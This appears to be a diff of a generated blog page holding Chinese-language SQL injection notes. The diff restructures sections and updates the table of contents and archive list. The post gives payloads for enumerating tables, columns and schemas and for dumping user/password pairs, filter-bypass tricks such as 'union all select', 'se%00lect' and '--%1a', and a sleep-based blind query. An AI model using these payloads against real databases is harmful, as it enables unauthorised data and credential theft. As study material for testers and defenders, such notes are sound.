@@ -267,7 +267,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">2,119</span> / Reading time: <span class="post-count">10 min</span></span>
+                        <span>Word count: <span class="post-count">2,132</span> / Reading time: <span class="post-count">10 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -396,23 +396,26 @@
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <ul>
-<li><p>表名</p>
+        <h1 id="通用注入语句"><a href="#通用注入语句" class="headerlink" title="通用注入语句:"></a>通用注入语句:</h1><ul>
+<li>表名</li>
+</ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(distinct table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>列名</p>
+<ul>
+<li>列名</li>
+</ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>数据库</p>
+<ul>
+<li>数据库</li>
+</ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>表内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,concat(user, 0x2c, password) from [table_name]</span><br></pre></td></tr></table></figure>
-<p>​</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">优先级 运算符</span><br><span class="line">(最高)  !</span><br><span class="line">    -（负号）,~（按位取反）</span><br><span class="line">    ^（按位异或）</span><br><span class="line">    *,/(DIV),%(MOD)</span><br><span class="line">    +,-</span><br><span class="line">    &gt;&gt;,&lt;&lt;</span><br><span class="line">    &amp;</span><br><span class="line">    |</span><br><span class="line">    =(比较运算),&lt;=&gt;,&lt;,&lt;=,&gt;,&gt;=,!=,&lt;&gt;,IN,IS NULL,LIKE,REGEXP</span><br><span class="line">   BETWEEN AND,CASE,WHEN,THEN,ELSE</span><br><span class="line">   NOT</span><br><span class="line">   &amp;&amp;,AND</span><br><span class="line">   XOR</span><br><span class="line">   ||,OR</span><br><span class="line">(最低)    =(赋值运算),:=</span><br></pre></td></tr></table></figure>
+<ul>
+<li>表内容<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,concat(user, 0x2c, password) from [table_name]</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<h1 id="union-select-不允许同时出现"><a href="#union-select-不允许同时出现" class="headerlink" title="union select 不允许同时出现"></a>union select 不允许同时出现</h1><p>过滤正则表达式如下:<br><code><br>union[\s\xA0]+select<br></code><br><br>可以使用union all select绕过</p>
+<h1 id="运算符优先级："><a href="#运算符优先级：" class="headerlink" title="运算符优先级："></a>运算符优先级：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">优先级 运算符</span><br><span class="line">(最高)  !</span><br><span class="line">    -（负号）,~（按位取反）</span><br><span class="line">    ^（按位异或）</span><br><span class="line">    *,/(DIV),%(MOD)</span><br><span class="line">    +,-</span><br><span class="line">    &gt;&gt;,&lt;&lt;</span><br><span class="line">    &amp;</span><br><span class="line">    |</span><br><span class="line">    =(比较运算),&lt;=&gt;,&lt;,&lt;=,&gt;,&gt;=,!=,&lt;&gt;,IN,IS NULL,LIKE,REGEXP</span><br><span class="line">   BETWEEN AND,CASE,WHEN,THEN,ELSE</span><br><span class="line">   NOT</span><br><span class="line">   &amp;&amp;,AND</span><br><span class="line">   XOR</span><br><span class="line">   ||,OR</span><br><span class="line">(最低)    =(赋值运算),:=</span><br></pre></td></tr></table></figure>
+<h1 id="union-select-不允许同时出现"><a href="#union-select-不允许同时出现" class="headerlink" title="union select 不允许同时出现"></a>union select 不允许同时出现</h1><p>过滤正则表达式如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union[\s\xA0]+select</span><br></pre></td></tr></table></figure>
+<p>可以使用union all select绕过</p>
 <h1 id="select过滤"><a href="#select过滤" class="headerlink" title="select过滤"></a>select过滤</h1><p>se%00lect绕过</p>
 <h1 id="–-注释"><a href="#–-注释" class="headerlink" title="– 注释"></a>– 注释</h1><p>–后边不允许添加任何空白字符<br>过滤正则表达式如下:<br>–[\s\xA0]<br>还可以使用%1a<br>–%1a绕过</p>
 <h1 id="where后边跟着sleep函数"><a href="#where后边跟着sleep函数" class="headerlink" title="where后边跟着sleep函数"></a>where后边跟着sleep函数</h1><p><code>select * from table_name where sleep(2) or 1 = 2;</code></p>
@@ -613,7 +616,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#union-select-不允许同时出现"><span class="toc-number">1.</span> <span class="toc-text">union select 不允许同时出现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#select过滤"><span class="toc-number">2.</span> <span class="toc-text">select过滤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#–-注释"><span class="toc-number">3.</span> <span class="toc-text">– 注释</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#where后边跟着sleep函数"><span class="toc-number">4.</span> <span class="toc-text">where后边跟着sleep函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNSlog盲注"><span class="toc-number">5.</span> <span class="toc-text">DNSlog盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql大小写不敏感，绕过检测"><span class="toc-number">6.</span> <span class="toc-text">Mysql大小写不敏感，绕过检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#heavy-query"><span class="toc-number">7.</span> <span class="toc-text">heavy query</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#笛卡尔积运算"><span class="toc-number">7.1.</span> <span class="toc-text">笛卡尔积运算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-lock"><span class="toc-number">7.2.</span> <span class="toc-text">Get_lock</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rlike"><span class="toc-number">7.3.</span> <span class="toc-text">Rlike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sleep"><span class="toc-number">7.4.</span> <span class="toc-text">sleep</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#通用注入语句"><span class="toc-number">1.</span> <span class="toc-text">通用注入语句:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#运算符优先级："><span class="toc-number">2.</span> <span class="toc-text">运算符优先级：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#union-select-不允许同时出现"><span class="toc-number">3.</span> <span class="toc-text">union select 不允许同时出现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#select过滤"><span class="toc-number">4.</span> <span class="toc-text">select过滤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#–-注释"><span class="toc-number">5.</span> <span class="toc-text">– 注释</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#where后边跟着sleep函数"><span class="toc-number">6.</span> <span class="toc-text">where后边跟着sleep函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNSlog盲注"><span class="toc-number">7.</span> <span class="toc-text">DNSlog盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql大小写不敏感，绕过检测"><span class="toc-number">8.</span> <span class="toc-text">Mysql大小写不敏感，绕过检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#heavy-query"><span class="toc-number">9.</span> <span class="toc-text">heavy query</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#笛卡尔积运算"><span class="toc-number">9.1.</span> <span class="toc-text">笛卡尔积运算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-lock"><span class="toc-number">9.2.</span> <span class="toc-text">Get_lock</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rlike"><span class="toc-number">9.3.</span> <span class="toc-text">Rlike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sleep"><span class="toc-number">9.4.</span> <span class="toc-text">sleep</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -626,30 +629,6 @@
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1357,12 +1336,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
